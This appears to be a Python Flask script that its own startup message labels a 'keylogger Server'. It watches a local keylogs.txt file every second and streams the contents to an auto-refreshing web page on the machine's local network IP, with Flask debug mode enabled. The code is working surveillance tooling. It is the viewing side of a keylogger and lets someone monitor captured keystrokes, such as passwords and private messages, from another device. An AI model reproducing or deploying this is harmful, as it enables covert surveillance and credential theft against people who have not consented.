import socket
from flask import Flask, render_template_string
import os, time, threading

# Get the local IP address by creating a UDP socket
def get_wifi_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Connects to Google's public DNS
        ip_address = s.getsockname()[0]
        s.close()
        return ip_address
    except Exception as e:
        return str(e)
    
print(f"[*] keylogger Server IP: {get_wifi_ip()}")   


app = Flask(__name__)
TEXT_FILE = "keylogs.txt"  # Change this to your text file path
last_modified_time = None
file_content_cache = "Loading..."

def watch_file():
    global last_modified_time, file_content_cache
    while True:
        try:
            modified_time = os.path.getmtime(TEXT_FILE)
            if last_modified_time is None or modified_time > last_modified_time:
                last_modified_time = modified_time
                with open(TEXT_FILE, "r") as f:
                    file_content_cache = f.read()
        except FileNotFoundError:
            file_content_cache = "File not found."
        time.sleep(1)  # Check for file updates every second

@app.route('/')
def index():
    return render_template_string('''
    <html>
    <head>
        <script>
            function fetchData() {
                fetch("/content")
                .then(response => response.text())
                .then(data => {
                    let contentElement = document.getElementById("content");
                    if (contentElement.innerText !== data) {
                        contentElement.innerText = data;
                    }
                });
            }
            setInterval(fetchData, 1000);
            window.onload = fetchData;
        </script>
    </head>
    <body>
        <pre id="content">Loading...</pre>
    </body>
    </html>
    ''')

@app.route('/content')
def content():
    return file_content_cache

if __name__ == '__main__':
    threading.Thread(target=watch_file, daemon=True).start()
    app.run(host=get_wifi_ip(), port=8080 ,debug=True, threaded=True)
